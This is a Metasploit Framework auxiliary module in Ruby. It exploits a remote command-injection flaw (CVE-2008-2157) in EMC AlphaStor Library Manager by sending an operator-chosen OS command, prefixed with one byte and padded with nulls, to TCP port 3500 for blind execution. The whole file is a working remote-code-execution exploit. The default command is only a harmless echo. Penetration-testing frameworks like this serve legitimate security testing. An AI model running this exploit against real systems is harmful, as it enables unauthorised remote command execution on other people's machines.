##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'


class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'EMC AlphaStor Library Manager Arbitrary Command Execution',
      'Description'    => %q{
          EMC AlphaStor Library Manager is prone to a remote command-injection vulnerability
          because the application fails to properly sanitize user-supplied input.
      },
      'Author'         => [ 'MC' ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'URL', 'http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=703' ],
          [ 'CVE', '2008-2157' ],
          [ 'OSVDB', '45715' ],
          [ 'BID', '29398' ],
        ],
      'DisclosureDate' => 'May 27 2008'))

      register_options(
        [
          Opt::RPORT(3500),
          OptString.new('CMD', [ false, 'The OS command to execute', 'echo metasploit > metasploit.txt']),
        ], self.class)
  end

  def run
    connect

    data = "\x75" + datastore['CMD']
    pad  = "\x00" * 512

    pkt = data + pad

    # commands are executed blindly.
    print_status("Sending command: #{datastore['CMD']}")
    sock.put(pkt)

    Rex.sleep(1)

    sock.get_once

    print_status("Executed '#{datastore['CMD']}'...")

    disconnect
  end
end
